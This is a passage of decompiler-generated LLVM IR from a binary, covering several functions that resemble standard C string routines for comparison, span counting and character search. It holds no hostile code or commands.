  %v3_15d6c = icmp eq i32 %v2_15d6c, 0
  %or.cond = or i1 %v2_15d68, %v3_15d6c
  %v2_15d70 = and i32 %v3_15d7c, 16711680
  %v3_15d70 = icmp eq i32 %v2_15d70, 0
  %or.cond31 = or i1 %v3_15d70, %or.cond
  %v4_15d74 = icmp ult i32 %v3_15d7c, 16777216
  %or.cond32 = or i1 %v4_15d74, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_15d84, label %.thread4

dec_label_pc_15d84:                               ; preds = %.thread4, %.preheader.preheader
  %v1_15d7813.lcssa = phi i32 [ %v1_15d4c, %.preheader.preheader ], [ %v2_15d7814, %.thread4 ]
  %v2_15d68.lcssa = phi i1 [ %v2_15d6839, %.preheader.preheader ], [ %v2_15d68, %.thread4 ]
  %v3_15d6c.lcssa = phi i1 [ %v3_15d6c41, %.preheader.preheader ], [ %v3_15d6c, %.thread4 ]
  %v3_15d70.lcssa = phi i1 [ %v3_15d7044, %.preheader.preheader ], [ %v3_15d70, %.thread4 ]
  br i1 %v2_15d68.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_15d84
  %v2_15d88 = add i32 %v1_15d7813.lcssa, 1
  br i1 %v3_15d6c.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_15d9017 = add i32 %v1_15d7813.lcssa, 2
  br i1 %v3_15d70.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_15d98 = add i32 %v1_15d7813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_15d84, %bb35, %bb36, %bb37
  %v1_15d9c = phi i32 [ %v2_15d88, %bb35 ], [ %v2_15d9017, %bb36 ], [ %v2_15d98, %bb37 ], [ %v1_15d7813.lcssa, %dec_label_pc_15d84 ]
  ret i32 %v1_15d9c

; uselistorder directives
  uselistorder i32 %v1_15d7813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_15d7c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15d74.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15d48, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 13 }
  uselistorder i32 -2, { 1, 3, 4, 2, 6, 7, 8, 0, 5, 9, 25, 24, 26, 27, 28, 17, 18, 19, 20, 21, 22, 23, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 65535, { 2, 105, 0, 1, 10, 53, 3, 29, 54, 28, 55, 26, 56, 27, 57, 58, 11, 59, 4, 60, 61, 33, 62, 32, 63, 30, 64, 31, 65, 13, 12, 66, 67, 34, 68, 35, 69, 15, 14, 70, 71, 36, 72, 37, 73, 16, 17, 5, 6, 24, 23, 39, 74, 38, 75, 18, 19, 7, 40, 76, 41, 77, 78, 79, 20, 80, 81, 8, 42, 82, 43, 83, 44, 84, 85, 86, 21, 87, 88, 9, 47, 89, 45, 90, 46, 91, 92, 22, 93, 25, 48, 94, 49, 95, 50, 96, 97, 98, 51, 99, 100, 101, 102, 52, 103, 104 }
  uselistorder i32 -4, { 41, 18, 62, 63, 64, 6, 19, 20, 21, 65, 66, 67, 7, 22, 23, 24, 68, 69, 70, 8, 25, 26, 71, 17, 16, 72, 73, 74, 15, 14, 13, 12, 27, 28, 29, 30, 31, 5, 32, 3, 33, 4, 75, 11, 34, 49, 50, 51, 9, 52, 53, 54, 35, 48, 2, 36, 42, 43, 44, 45, 46, 47, 0, 1, 55, 56, 57, 58, 59, 60, 61, 37, 38, 39, 40, 10 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_15da0(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15da4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15da0

dec_label_pc_15da0:                               ; preds = %bb3, %bb
  %v0_15da4 = phi i32 [ %v0_15da4.pre, %bb ], [ %v5_15da4, %bb3 ]
  %v0_15da0 = phi i32 [ %tmp, %bb ], [ %v5_15da0, %bb3 ]
  %v1_15da0 = inttoptr i32 %v0_15da0 to i8*
  %v2_15da0 = load i8, i8* %v1_15da0, align 1
  %v1_15da4 = inttoptr i32 %v0_15da4 to i8*
  %v2_15da4 = load i8, i8* %v1_15da4, align 1
  %v3_15da4 = zext i8 %v2_15da4 to i32
  %v2_15da8 = icmp eq i8 %v2_15da0, 0
  br i1 %v2_15da8, label %.dec_label_pc_15db4_crit_edge, label %bb3

bb3:                                              ; preds = %dec_label_pc_15da0
  %v5_15da4 = add i32 %v0_15da4, 1
  %v5_15da0 = add i32 %v0_15da0, 1
  %v3_15da0 = zext i8 %v2_15da0 to i32
  %v10_15dac = icmp eq i8 %v2_15da0, %v2_15da4
  br i1 %v10_15dac, label %dec_label_pc_15da0, label %dec_label_pc_15db4

.dec_label_pc_15db4_crit_edge:                    ; preds = %dec_label_pc_15da0
  br label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %bb3, %.dec_label_pc_15db4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_15db4_crit_edge ], [ %v3_15da0, %bb3 ]
  %v2_15db4.pre-phi = sub nsw i32 %.pn, %v3_15da4
  ret i32 %v2_15db4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_15da0, { 0, 2, 1 }
  uselistorder i32 %v0_15da0, { 1, 0 }
  uselistorder i32 %v0_15da4, { 1, 0 }
  uselistorder label %dec_label_pc_15db4, { 1, 0 }
}

define i32 @function_15dc0() local_unnamed_addr {
dec_label_pc_15dc0:
  %stack_var_-16 = alloca i32, align 4
  %v3_15dc0 = load i32, i32* @r4, align 4
  store i32 %v3_15dc0, i32* %stack_var_-16, align 4
  %v6_15dc0 = load i32, i32* @r5, align 4
  %v9_15dc0 = load i32, i32* @r6, align 4
  %v0_15dc4 = load i32, i32* @r0, align 4
  %v0_15dc8 = load i32, i32* @r1, align 4
  store i32 %v0_15dc8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_15de48 = inttoptr i32 %v0_15dc4 to i8*
  %v2_15de49 = load i8, i8* %v1_15de48, align 1
  %v2_15de811 = icmp eq i8 %v2_15de49, 0
  store i32 %v0_15dc8, i32* @r0, align 4
  %v1_15df012 = add i32 %v0_15dc4, 1
  store i32 %v1_15df012, i32* @r4, align 4
  br i1 %v2_15de811, label %dec_label_pc_15df8, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dc0, %dec_label_pc_15de0
  %v3_15de414.in = phi i8 [ %v2_15de4, %dec_label_pc_15de0 ], [ %v2_15de49, %dec_label_pc_15dc0 ]
  %v0_15dec13 = phi i32 [ %v0_15dec.pre, %dec_label_pc_15de0 ], [ %v0_15dc8, %dec_label_pc_15dc0 ]
  %v3_15de414 = zext i8 %v3_15de414.in to i32
  %v2_15dd4 = call i32 @function_15f8c(i32 %v0_15dec13, i32 %v3_15de414)
  %v2_15dd8 = icmp eq i32 %v2_15dd4, 0
  %v0_15de0 = load i32, i32* @r5, align 4
  br i1 %v2_15dd8, label %dec_label_pc_15de0, label %dec_label_pc_15df8

dec_label_pc_15de0:                               ; preds = %dec_label_pc_15dd4
  %v1_15de0 = add i32 %v0_15de0, 1
  %v0_15de4.pre = load i32, i32* @r4, align 4
  %v0_15dec.pre = load i32, i32* @r6, align 4
  store i32 %v1_15de0, i32* @r5, align 4
  %v1_15de4 = inttoptr i32 %v0_15de4.pre to i8*
  %v2_15de4 = load i8, i8* %v1_15de4, align 1
  %v2_15de8 = icmp eq i8 %v2_15de4, 0
  store i32 %v0_15dec.pre, i32* @r0, align 4
  %v1_15df0 = add i32 %v0_15de4.pre, 1
  store i32 %v1_15df0, i32* @r4, align 4
  br i1 %v2_15de8, label %dec_label_pc_15df8, label %dec_label_pc_15dd4

dec_label_pc_15df8:                               ; preds = %dec_label_pc_15de0, %dec_label_pc_15dd4, %dec_label_pc_15dc0
  %v0_15df8 = phi i32 [ 0, %dec_label_pc_15dc0 ], [ %v0_15de0, %dec_label_pc_15dd4 ], [ %v1_15de0, %dec_label_pc_15de0 ]
  %v2_15dfc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15dfc, i32* @r4, align 4
  store i32 %v6_15dc0, i32* @r5, align 4
  store i32 %v9_15dc0, i32* @r6, align 4
  ret i32 %v0_15df8

; uselistorder directives
  uselistorder i8 %v2_15de4, { 1, 0 }
  uselistorder i32 %v0_15dec.pre, { 1, 0 }
  uselistorder i32 %v0_15de4.pre, { 1, 0 }
  uselistorder i32* @r6, { 29, 2, 30, 31, 3, 32, 33, 34, 4, 35, 36, 24, 25, 37, 38, 5, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 6, 7, 56, 57, 58, 59, 60, 61, 62, 63, 26, 27, 28, 8, 9, 10, 416, 417, 418, 419, 420, 421, 422, 64, 11, 65, 12, 66, 414, 415, 365, 369, 370, 371, 372, 366, 367, 368, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 373, 398, 399, 400, 374, 375, 376, 377, 378, 13, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 394, 396, 390, 391, 392, 393, 395, 397, 110, 111, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 67, 96, 126, 127, 128, 129, 130, 131, 132, 97, 133, 89, 98, 99, 100, 101, 102, 68, 69, 70, 90, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 91, 92, 93, 94, 95, 103, 104, 105, 106, 107, 108, 109, 134, 135, 136, 1, 0, 137, 138, 139, 140, 141, 142, 143, 19, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 162, 163, 164, 165, 166, 21, 167, 168, 169, 170, 259, 260, 261, 262, 154, 155, 156, 157, 158, 159, 160, 161, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 14, 181, 182, 183, 184, 185, 186, 187, 188, 202, 203, 204, 205, 20, 206, 207, 208, 15, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 22, 16, 329, 330, 332, 333, 331, 334, 335, 336, 337, 338, 339, 401, 402, 23, 17, 403, 404, 406, 407, 405, 408, 409, 410, 411, 412, 413, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 18, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258 }
  uselistorder label %dec_label_pc_15dd4, { 1, 0 }
}

define i32 @function_15e04(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15e04:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_15e342 = load i32, i32* @r0, align 4
  %v1_15e343 = inttoptr i32 %v0_15e342 to i8*
  %v2_15e344 = load i8, i8* %v1_15e343, align 1
  %v3_15e345 = zext i8 %v2_15e344 to i32
  store i32 %v3_15e345, i32* @ip, align 4
  %v2_15e386 = icmp eq i8 %v2_15e344, 0
  br i1 %v2_15e386, label %dec_label_pc_15e44, label %dec_label_pc_15e18.preheader

dec_label_pc_15e10:                               ; preds = %dec_label_pc_15e18
  %v3_15e18 = zext i8 %v2_15e18 to i32
  %v1_15e20 = add i32 %v0_15e20, 1
  %v9_15e10 = icmp eq i32 %v0_15e1010, %v3_15e18
  br i1 %v9_15e10, label %dec_label_pc_15e2c, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15e18.preheader, %dec_label_pc_15e10
  %v0_15e20 = phi i32 [ %tmp, %dec_label_pc_15e18.preheader ], [ %v1_15e20, %dec_label_pc_15e10 ]
  %v1_15e18 = inttoptr i32 %v0_15e20 to i8*
  %v2_15e18 = load i8, i8* %v1_15e18, align 1
  %v2_15e1c = icmp eq i8 %v2_15e18, 0
  br i1 %v2_15e1c, label %dec_label_pc_15e44, label %dec_label_pc_15e10

dec_label_pc_15e2c:                               ; preds = %dec_label_pc_15e10
  %v1_15e2c = add i32 %v0_15e2c, 1
  %v1_15e30 = add i32 %v0_15e30, 1
  %v1_15e34 = inttoptr i32 %v1_15e30 to i8*
  %v2_15e34 = load i8, i8* %v1_15e34, align 1
  %v3_15e34 = zext i8 %v2_15e34 to i32
  store i32 %v3_15e34, i32* @ip, align 4
  %v2_15e38 = icmp eq i8 %v2_15e34, 0
  br i1 %v2_15e38, label %dec_label_pc_15e44, label %dec_label_pc_15e18.preheader

dec_label_pc_15e18.preheader:                     ; preds = %dec_label_pc_15e04, %dec_label_pc_15e2c
  %v0_15e30 = phi i32 [ %v1_15e30, %dec_label_pc_15e2c ], [ %v0_15e342, %dec_label_pc_15e04 ]
  %v0_15e2c = phi i32 [ %v1_15e2c, %dec_label_pc_15e2c ], [ 0, %dec_label_pc_15e04 ]
  %v0_15e1010 = phi i32 [ %v3_15e34, %dec_label_pc_15e2c ], [ %v3_15e345, %dec_label_pc_15e04 ]
  br label %dec_label_pc_15e18

dec_label_pc_15e44:                               ; preds = %dec_label_pc_15e2c, %dec_label_pc_15e18, %dec_label_pc_15e04
  %v0_15e44 = phi i32 [ 0, %dec_label_pc_15e04 ], [ %v0_15e2c, %dec_label_pc_15e18 ], [ %v1_15e2c, %dec_label_pc_15e2c ]
  ret i32 %v0_15e44

; uselistorder directives
  uselistorder i32 %v0_15e20, { 1, 0 }
  uselistorder label %dec_label_pc_15e18.preheader, { 1, 0 }
}

define i32 @function_15e50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15e50:
  store i32 %arg1, i32* @r0, align 4
  %v1_15e54 = urem i32 %arg2, 256
  store i32 %v1_15e54, i32* @r4, align 4
  %v2_15e54 = icmp eq i32 %v1_15e54, 0
  br i1 %v2_15e54, label %dec_label_pc_15e68, label %dec_label_pc_15e7c.preheader

dec_label_pc_15e7c.preheader:                     ; preds = %dec_label_pc_15e50
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_15e843 = call i32 @function_15f8c(i32 %arg1, i32 %v1_15e54)
  %v2_15e885 = icmp eq i32 %v2_15e843, 0
  br i1 %v2_15e885, label %dec_label_pc_15e90, label %dec_label_pc_15e74

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e50
  %v2_15e6c = call i32 @function_15f8c(i32 %arg1, i32 0)
  br label %dec_label_pc_15e94

dec_label_pc_15e74:                               ; preds = %dec_label_pc_15e7c.preheader, %dec_label_pc_15e74
  %v2_15e846 = phi i32 [ %v2_15e84, %dec_label_pc_15e74 ], [ %v2_15e843, %dec_label_pc_15e7c.preheader ]
  store i32 %v2_15e846, i32* @r5, align 4
  %v1_15e78 = add i32 %v2_15e846, 1
  store i32 %v1_15e78, i32* @r0, align 4
  %v0_15e80 = load i32, i32* @r4, align 4
  %v2_15e84 = call i32 @function_15f8c(i32 %v1_15e78, i32 %v0_15e80)
  %v2_15e88 = icmp eq i32 %v2_15e84, 0
  br i1 %v2_15e88, label %dec_label_pc_15e90, label %dec_label_pc_15e74

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e74, %dec_label_pc_15e7c.preheader
  %v0_15e90 = load i32, i32* @r5, align 4
  br label %dec_label_pc_15e94

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e68, %dec_label_pc_15e90
  %storemerge = phi i32 [ %v2_15e6c, %dec_label_pc_15e68 ], [ %v0_15e90, %dec_label_pc_15e90 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_15e84, { 1, 0 }
  uselistorder i32 %v1_15e78, { 1, 0 }
  uselistorder i32 %v1_15e54, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_15f8c, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15e94, { 1, 0 }
  uselistorder label %dec_label_pc_15e74, { 1, 0 }
}

define i32 @function_15ea0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15ea0:
  %v1_15ea4 = urem i32 %arg1, 256
  %v0_15ec42 = load i32, i32* @r0, align 4
  %v1_15ec43 = urem i32 %v0_15ec42, 4
  %v2_15ec44 = icmp eq i32 %v1_15ec43, 0
  br i1 %v2_15ec44, label %dec_label_pc_15ecc, label %dec_label_pc_15eac

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15ea0, %dec_label_pc_15ec0
  %v0_15ec0 = phi i32 [ %v1_15ec0, %dec_label_pc_15ec0 ], [ %v0_15ec42, %dec_label_pc_15ea0 ]
  %v1_15eac = inttoptr i32 %v0_15ec0 to i8*
  %v2_15eac = load i8, i8* %v1_15eac, align 1
  %v3_15eac = zext i8 %v2_15eac to i32
  %v9_15eb0 = icmp eq i32 %v3_15eac, %v1_15ea4
  br i1 %v9_15eb0, label %dec_label_pc_15f7c, label %dec_label_pc_15eb8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15eac
  %v2_15eb8 = icmp eq i8 %v2_15eac, 0
  br i1 %v2_15eb8, label %dec_label_pc_15f7c, label %dec_label_pc_15ec0

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15eb8
  %v1_15ec0 = add i32 %v0_15ec0, 1
  %v1_15ec4 = urem i32 %v1_15ec0, 4
  %v2_15ec4 = icmp eq i32 %v1_15ec4, 0
  br i1 %v2_15ec4, label %dec_label_pc_15ecc, label %dec_label_pc_15eac

dec_label_pc_15ecc:                               ; preds = %dec_label_pc_15ec0, %dec_label_pc_15ea0
  %v0_15ed0 = phi i32 [ %v0_15ec42, %dec_label_pc_15ea0 ], [ %v1_15ec0, %dec_label_pc_15ec0 ]
  %v4_15ecc = mul nuw nsw i32 %v1_15ea4, 256
  %v5_15ecc = or i32 %v4_15ecc, %v1_15ea4
  %v4_15ed4 = mul i32 %v5_15ecc, 65536
  %v5_15ed4 = or i32 %v4_15ed4, %v5_15ecc
  br label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %dec_label_pc_15f74, %dec_label_pc_15f14, %dec_label_pc_15ecc
  %v0_15f3c = phi i32 [ %v0_15ed0, %dec_label_pc_15ecc ], [ %v4_15ed8, %dec_label_pc_15f14 ], [ %v4_15ed8, %dec_label_pc_15f74 ]
  %v1_15ed8 = inttoptr i32 %v0_15f3c to i32*
  %v2_15ed8 = load i32, i32* %v1_15ed8, align 4
  %v4_15ed8 = add i32 %v0_15f3c, 4
  %v2_15ee0 = xor i32 %v2_15ed8, %v5_15ed4
  %v2_15ee4 = add i32 %v2_15ee0, 2130640639
  store i32 %v2_15ee4, i32* @ip, align 4
  %v2_15eec = add i32 %v2_15ed8, 2130640639
  %v1_15ef0 = sub i32 -1, %v2_15ed8
  %v2_15ef4 = xor i32 %v2_15eec, %v1_15ef0
  %v2_15f00 = and i32 %v2_15ef4, -2130640640
  %v2_15f08 = icmp eq i32 %v2_15f00, 0
  br i1 %v2_15f08, label %dec_label_pc_15f14, label %dec_label_pc_15f1c

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15ed8
  %v1_15efc = sub i32 -1, %v2_15ee0
  %v2_15f04 = xor i32 %v2_15ee4, %v1_15efc
  %v2_15f0c = and i32 %v2_15f04, -2130640640
  %v2_15f14 = icmp eq i32 %v2_15f0c, 0
  br i1 %v2_15f14, label %dec_label_pc_15ed8, label %dec_label_pc_15f1c

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15ed8, %dec_label_pc_15f14
  %v2_15f1c = inttoptr i32 %v0_15f3c to i8*
  %v3_15f1c = load i8, i8* %v2_15f1c, align 1
  %v4_15f1c = zext i8 %v3_15f1c to i32
  %v9_15f20 = icmp eq i32 %v4_15f1c, %v1_15ea4
  br i1 %v9_15f20, label %dec_label_pc_15f7c, label %dec_label_pc_15f2c

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f1c
  %v2_15f2c = icmp eq i8 %v3_15f1c, 0
  br i1 %v2_15f2c, label %dec_label_pc_15f7c, label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f2c
  %v1_15f34 = add i32 %v0_15f3c, 1
  %v2_15f34 = inttoptr i32 %v1_15f34 to i8*
  %v3_15f34 = load i8, i8* %v2_15f34, align 1
  %v4_15f34 = zext i8 %v3_15f34 to i32
  %v9_15f38 = icmp eq i32 %v4_15f34, %v1_15ea4
  br i1 %v9_15f38, label %dec_label_pc_15f7c, label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15f34
  %v2_15f44 = icmp eq i8 %v3_15f34, 0
  br i1 %v2_15f44, label %dec_label_pc_15f7c, label %dec_label_pc_15f4c

dec_label_pc_15f4c:                               ; preds = %dec_label_pc_15f44
  %v1_15f4c = add i32 %v0_15f3c, 2
  %v2_15f4c = inttoptr i32 %v1_15f4c to i8*
  %v3_15f4c = load i8, i8* %v2_15f4c, align 1
  %v4_15f4c = zext i8 %v3_15f4c to i32
  %v9_15f50 = icmp eq i32 %v4_15f4c, %v1_15ea4
  br i1 %v9_15f50, label %dec_label_pc_15f7c, label %dec_label_pc_15f5c

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f4c
  %v2_15f5c = icmp eq i8 %v3_15f4c, 0
  br i1 %v2_15f5c, label %dec_label_pc_15f7c, label %dec_label_pc_15f64

dec_label_pc_15f64:                               ; preds = %dec_label_pc_15f5c
  %v1_15f64 = add i32 %v0_15f3c, 3
  %v2_15f64 = inttoptr i32 %v1_15f64 to i8*
  %v3_15f64 = load i8, i8* %v2_15f64, align 1
  %v4_15f64 = zext i8 %v3_15f64 to i32
  %v9_15f68 = icmp eq i32 %v4_15f64, %v1_15ea4
  br i1 %v9_15f68, label %dec_label_pc_15f7c, label %dec_label_pc_15f74

dec_label_pc_15f74:                               ; preds = %dec_label_pc_15f64
  %v2_15f74 = icmp eq i8 %v3_15f64, 0
  br i1 %v2_15f74, label %dec_label_pc_15f7c, label %dec_label_pc_15ed8

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15eb8, %dec_label_pc_15eac, %dec_label_pc_15f74, %dec_label_pc_15f64, %dec_label_pc_15f5c, %dec_label_pc_15f4c, %dec_label_pc_15f44, %dec_label_pc_15f34, %dec_label_pc_15f2c, %dec_label_pc_15f1c
  %v1_15f80 = phi i32 [ %v1_15f64, %dec_label_pc_15f74 ], [ %v1_15f64, %dec_label_pc_15f64 ], [ %v1_15f4c, %dec_label_pc_15f5c ], [ %v1_15f4c, %dec_label_pc_15f4c ], [ %v1_15f34, %dec_label_pc_15f44 ], [ %v1_15f34, %dec_label_pc_15f34 ], [ %v0_15f3c, %dec_label_pc_15f2c ], [ %v0_15f3c, %dec_label_pc_15f1c ], [ %v0_15ec0, %dec_label_pc_15eac ], [ %v0_15ec0, %dec_label_pc_15eb8 ]
  ret i32 %v1_15f80

; uselistorder directives
  uselistorder i32 %v4_15ed8, { 1, 0 }
  uselistorder i32 %v2_15ed8, { 0, 2, 1 }
  uselistorder i32 %v0_15f3c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_15ecc, { 1, 0 }
  uselistorder i32 %v1_15ec0, { 1, 0, 2 }
  uselistorder i32 %v0_15ec42, { 2, 1, 0 }
  uselistorder i32 %v1_15ea4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15f7c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_15f1c, { 1, 0 }
  uselistorder label %dec_label_pc_15eac, { 1, 0 }
}

define i32 @function_15f8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15f8c:
  %v1_15f90 = urem i32 %arg1, 256
  %v0_15fb03 = load i32, i32* @r0, align 4
  %v1_15fb04 = urem i32 %v0_15fb03, 4
  %v2_15fb05 = icmp eq i32 %v1_15fb04, 0
  br i1 %v2_15fb05, label %dec_label_pc_15fb8, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f8c, %dec_label_pc_15fac
  %v0_15fac = phi i32 [ %v1_15fac, %dec_label_pc_15fac ], [ %v0_15fb03, %dec_label_pc_15f8c ]
  %v1_15f98 = inttoptr i32 %v0_15fac to i8*
  %v2_15f98 = load i8, i8* %v1_15f98, align 1
  %v3_15f98 = zext i8 %v2_15f98 to i32
  %v9_15f9c = icmp eq i32 %v3_15f98, %v1_15f90
  br i1 %v9_15f9c, label %dec_label_pc_1606c, label %dec_label_pc_15fa4

dec_label_pc_15fa4:                               ; preds = %dec_label_pc_15f98
  %v2_15fa4 = icmp eq i8 %v2_15f98, 0
  br i1 %v2_15fa4, label %dec_label_pc_16068, label %dec_label_pc_15fac

dec_label_pc_15fac:                               ; preds = %dec_label_pc_15fa4
  %v1_15fac = add i32 %v0_15fac, 1
  %v1_15fb0 = urem i32 %v1_15fac, 4
  %v2_15fb0 = icmp eq i32 %v1_15fb0, 0
  br i1 %v2_15fb0, label %dec_label_pc_15fb8, label %dec_label_pc_15f98

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fac, %dec_label_pc_15f8c
  %v0_15fbc = phi i32 [ %v0_15fb03, %dec_label_pc_15f8c ], [ %v1_15fac, %dec_label_pc_15fac ]
  %v4_15fb8 = mul nuw nsw i32 %v1_15f90, 256
  %v5_15fb8 = or i32 %v4_15fb8, %v1_15f90
  %v4_15fc0 = mul i32 %v5_15fb8, 65536
  %v5_15fc0 = or i32 %v4_15fc0, %v5_15fb8
  br label %dec_label_pc_15fc4

dec_label_pc_15fc4:                               ; preds = %dec_label_pc_16060, %dec_label_pc_16000, %dec_label_pc_15fb8
  %v0_16028 = phi i32 [ %v0_15fbc, %dec_label_pc_15fb8 ], [ %v4_15fc4, %dec_label_pc_16000 ], [ %v4_15fc4, %dec_label_pc_16060 ]
  %v1_15fc4 = inttoptr i32 %v0_16028 to i32*
  %v2_15fc4 = load i32, i32* %v1_15fc4, align 4
  %v4_15fc4 = add i32 %v0_16028, 4
  %v2_15fcc = xor i32 %v2_15fc4, %v5_15fc0
  %v2_15fd0 = add i32 %v2_15fcc, 2130640639
  store i32 %v2_15fd0, i32* @ip, align 4
  %v2_15fd8 = add i32 %v2_15fc4, 2130640639
  %v1_15fdc = sub i32 -1, %v2_15fc4
  %v2_15fe0 = xor i32 %v2_15fd8, %v1_15fdc
  %v2_15fec = and i32 %v2_15fe0, -2130640640
  %v2_15ff4 = icmp eq i32 %v2_15fec, 0
  br i1 %v2_15ff4, label %dec_label_pc_16000, label %dec_label_pc_16008

dec_label_pc_16000:                               ; preds = %dec_label_pc_15fc4
  %v1_15fe8 = sub i32 -1, %v2_15fcc
  %v2_15ff0 = xor i32 %v2_15fd0, %v1_15fe8
  %v2_15ff8 = and i32 %v2_15ff0, -2130640640
  %v2_16000 = icmp eq i32 %v2_15ff8, 0
  br i1 %v2_16000, label %dec_label_pc_15fc4, label %dec_label_pc_16008

dec_label_pc_16008:                               ; preds = %dec_label_pc_15fc4, %dec_label_pc_16000
  %v2_16008 = inttoptr i32 %v0_16028 to i8*
  %v3_16008 = load i8, i8* %v2_16008, align 1
  %v4_16008 = zext i8 %v3_16008 to i32
  %v9_1600c = icmp eq i32 %v4_16008, %v1_15f90
  br i1 %v9_1600c, label %dec_label_pc_1606c, label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %dec_label_pc_16008
  %v2_16018 = icmp eq i8 %v3_16008, 0
  br i1 %v2_16018, label %dec_label_pc_16068, label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %dec_label_pc_16018
  %v1_16020 = add i32 %v0_16028, 1
  %v2_16020 = inttoptr i32 %v1_16020 to i8*
  %v3_16020 = load i8, i8* %v2_16020, align 1
  %v4_16020 = zext i8 %v3_16020 to i32
  %v9_16024 = icmp eq i32 %v4_16020, %v1_15f90
  br i1 %v9_16024, label %dec_label_pc_1606c, label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_16020
  %v2_16030 = icmp eq i8 %v3_16020, 0
  br i1 %v2_16030, label %dec_label_pc_16068, label %dec_label_pc_16038

dec_label_pc_16038:                               ; preds = %dec_label_pc_16030
  %v1_16038 = add i32 %v0_16028, 2
  %v2_16038 = inttoptr i32 %v1_16038 to i8*
  %v3_16038 = load i8, i8* %v2_16038, align 1
  %v4_16038 = zext i8 %v3_16038 to i32
  %v9_1603c = icmp eq i32 %v4_16038, %v1_15f90
  br i1 %v9_1603c, label %dec_label_pc_1606c, label %dec_label_pc_16048

dec_label_pc_16048:                               ; preds = %dec_label_pc_16038
  %v2_16048 = icmp eq i8 %v3_16038, 0
  br i1 %v2_16048, label %dec_label_pc_16068, label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %dec_label_pc_16048
  %v1_16050 = add i32 %v0_16028, 3
  %v2_16050 = inttoptr i32 %v1_16050 to i8*
